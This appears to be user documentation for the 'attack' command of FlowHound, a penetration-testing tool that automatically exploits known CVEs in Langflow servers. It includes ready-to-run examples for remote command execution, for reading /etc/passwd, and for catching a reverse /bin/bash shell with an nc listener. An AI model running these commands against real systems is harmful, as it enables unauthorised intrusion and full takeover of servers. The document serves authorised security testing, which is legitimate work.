# Attack

The `attack` command launches exploit modules against a target Langflow instance.

!!! warning "Authorised use only"
    Only run `attack` against systems you own or have explicit written permission to test.

---

## Purpose

`attack` automates the full exploitation workflow:

1. Detects the running Langflow version via `/api/v1/version`.
2. Queries the vulnerability database for CVEs that match the version and authentication state.
3. Prioritises unauthenticated RCE exploits.
4. Runs each matching exploit with a 60-second timeout.
5. Stops at the first successful exploit unless `--autopwn` is set.

---

## Syntax

```
flowhound attack --url <URL> [OPTIONS]
```

---

## Options

| Option | Required | Description |
|---|---|---|
| `--url` | Yes | URL of the target Langflow instance (e.g. `http://localhost:7860`) |
| `--username` | No | Langflow username — must be paired with `--password` |
| `--password` | No | Langflow password — must be paired with `--username` |
| `--autopwn` | No | Run all matching exploits instead of stopping at the first success |
| `--proxy` | No | HTTP(S) proxy to route all traffic through |
| `--command` | No | Shell command to run on the target via the `execute_bash_command` payload |
| `--reverse_shell` | No | `LHOST:LPORT` for a reverse TCP shell (e.g. `192.168.1.10:4444`) |
| `-h`, `--help` | No | Show help text and exit |

---

## Authentication

### Unauthenticated mode (default)

When `--username` and `--password` are omitted, FlowHound only attempts CVEs where `auth_required` is `false` in the vulnerability database.

### Authenticated mode

When both `--username` and `--password` are supplied, FlowHound also includes CVEs where `auth_required` is `true`. Two authentication mechanisms are used by individual exploit modules:

- **`auto_login`** — hits `/api/v1/auto_login` (works when Langflow's auto-login is enabled).
- **`authenticate`** — posts credentials to `/api/v1/login` and obtains a bearer token.

Each exploit module selects whichever mechanism is appropriate for the CVE it implements.

---

## Payload injection

When no payload flag is given, each exploit falls back to its built-in default, which runs `id` and exfiltrates the result.

### `--command "<cmd>"`

Injects an `execute_bash_command` payload that runs the specified shell command on the target via `subprocess.check_output`. The standard output is captured and returned in the exploit response.

```bash
flowhound attack --url http://TARGET:7860 --command "cat /etc/passwd"
```

### `--reverse_shell LHOST:LPORT`

Injects a `reverse_tcp_shell` payload that connects back to `LHOST:LPORT` using a raw TCP socket and hands off a `/bin/bash` shell via `os.execv`.

```bash
# Start a listener first:
nc -lvnp 4444

# Then launch the exploit:
flowhound attack --url http://TARGET:7860 --reverse_shell 192.168.1.10:4444
```

`--command` and `--reverse_shell` are mutually exclusive. Supplying both causes an immediate usage error.

---

## Exploit execution

Each exploit runs inside a `ThreadPoolExecutor` with a hard timeout of **60 seconds**. If an exploit does not return within that window it is skipped with a warning and FlowHound moves on to the next CVE.

The attack loop behaviour depends on `--autopwn`:

| Mode | Behaviour |
|---|---|
| Default | Stop after the first successful exploit |
| `--autopwn` | Continue running all remaining exploits regardless of success |

---

## Proxy support

Route all HTTP(S) traffic through a proxy (e.g. Burp Suite for traffic inspection):

```bash
flowhound attack --url http://TARGET:7860 --proxy http://127.0.0.1:8080
```

---

## Examples

**Unauthenticated attack, stop at first success:**

```bash
flowhound attack --url http://target.example.com:7860
```

**Authenticated attack:**

```bash
flowhound attack --url http://target.example.com:7860 --username admin --password secret
```

**Run all exploits with a custom command:**

```bash
flowhound attack --url http://target.example.com:7860 --autopwn --command "whoami"
```

**Catch a reverse shell:**

```bash
flowhound attack --url http://target.example.com:7860 --reverse_shell 192.168.1.10:4444
```

**All traffic through a proxy:**

```bash
flowhound attack --url http://target.example.com:7860 --proxy http://127.0.0.1:8080
```

---

## Error handling

| Error | Cause | Resolution |
|---|---|---|
| `Error retrieving target Langflow version` | Target unreachable or not a Langflow instance | Verify the URL and that the instance is running |
| `--command and --reverse_shell are mutually exclusive` | Both payload flags supplied | Supply only one |
| `--username and --password must be provided together` | Only one credential flag supplied | Supply both or neither |
| Exploit timeout warning | Exploit did not complete within 60 s | Target may be slow or the exploit path is blocked |

---

## See also

- [Sniff](sniff.md) — version detection without exploit execution.
- [Vulnerability Database](vulnerabilities.md) — full CVE list.
- [Architecture](architecture.md) — how exploit modules are discovered and loaded.
